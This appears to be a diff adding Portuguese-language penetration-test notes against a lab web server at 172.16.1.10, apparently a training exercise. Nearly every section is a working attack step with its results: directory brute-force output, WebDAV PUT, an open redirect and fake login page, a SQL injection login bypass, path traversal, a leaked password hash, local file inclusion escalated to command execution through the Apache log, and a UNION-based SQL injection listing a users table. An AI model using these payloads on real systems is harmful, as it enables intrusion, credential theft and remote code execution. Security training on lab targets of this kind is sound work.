@@ -1,0 +1,70 @@
+DIRETORIOS
+http://172.16.1.10/.htpasswd            (Status: 403) [Size: 276]
+http://172.16.1.10/.htaccess            (Status: 403) [Size: 276]
+http://172.16.1.10/hosting              (Status: 301) [Size: 312] [--> http://172.16.1.10/hosting/]
+http://172.16.1.10/logs                 (Status: 401) [Size: 458]                                  
+http://172.16.1.10/server-status        (Status: 403) [Size: 276]                                  
+http://172.16.1.10/turismo              (Status: 301) [Size: 312] [--> http://172.16.1.10/turismo/]
+http://172.16.1.10/webdav               (Status: 301) [Size: 311] [--> http://172.16.1.10/webdav/] 
+                                                                                                   
+ARQUIVOS
+http://172.16.1.10/turismo/adm.php              (Status: 200) [Size: 1610]
+http://172.16.1.10/turismo/banners              (Status: 301) [Size: 320] [--> http://172.16.1.10/turismo/banners/]
+http://172.16.1.10/turismo/css                  (Status: 301) [Size: 316] [--> http://172.16.1.10/turismo/css/]    
+http://172.16.1.10/turismo/img                  (Status: 301) [Size: 316] [--> http://172.16.1.10/turismo/img/]    
+http://172.16.1.10/turismo/index.php            (Status: 200) [Size: 2415]                                         
+http://172.16.1.10/turismo/info.php             (Status: 200) [Size: 2839]                                         
+http://172.16.1.10/turismo/link.php             (Status: 200) [Size: 432]                                          
+http://172.16.1.10/turismo/login.php            (Status: 200) [Size: 2073]                                         
+http://172.16.1.10/turismo/logout.php           (Status: 302) [Size: 267] [--> index.php]                          
+http://172.16.1.10/turismo/pages.php            (Status: 200) [Size: 72]                                           
+http://172.16.1.10/turismo/redir.php            (Status: 200) [Size: 72]                                           
+                                                                               
+METODOS ACEITOS
+/
+Allow: POST,OPTIONS,HEAD,GET
+
+/wedav/
+Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
+PUT = ok
+
+LINKD do CODIGO FONTE
+
+http://172.16.1.10/turismo/link.php?link=https://turismo.ig.com.br/manual-do-viajante/index
+http://172.16.1.10/turismo/cupom.php
+
+
+PAGINA DE LOGIN FALSA
+http://172.16.1.10/turismo/pages.php?page=aHR0cDovLzE5Mi4xNjguMjU0LjUxCg==
+PAGINA DE LOGIN ORIGINAL
+http://172.16.1.10/turismo/pages.php?page=bG9naW4ucGhw
+
+
+BYPASS DE AUTHENTICATION
+http://172.16.1.10/turismo/login.php
+hacker' or 1=1 limit 1;#
+User: MRTUR
+
+FULL PATCH DISCLOSURE
+/var/www/html/turismo/logado.php
+/var/www/html/turismo/logout.php
+/var/www/html/turismo/logado.php?banners
+
+PATCH/DIRECTORY TRANSVERSAL
+Parâmetro indefinido...
+Undefined index: banners in /var/www/html/turismo/logado.php
+orlando.jpg - floripa.jp - gmaceio.jpg
+Podendo fazer o teste de PATCH TRANSVERSAL
+http://172.16.1.10/turismo/logado.php?banners=/../../
+
+DANDO ACESSO AO ARQUIVO
+http://172.16.1.10/secr3tlgs
+administrador:$apr1$mN0Pqynw$Zo4QTRkA2GwcVVRR/FKSu1
+
+
+LFI -> RCE
+http://172.16.1.10/turismo/logado.php?banners=/../../../../var/log/apache2/access.log&param=ifconfig
+
+
+SQL inj
+http://172.16.1.10/turismo/agencias.php?loja=sp%27%20union%20select%201,2,column_name,4,5%20from%20information_schema.columns%20where%20table_schema=%22dbmrtur%22%20and%20table_name=%22mrusers%22%23
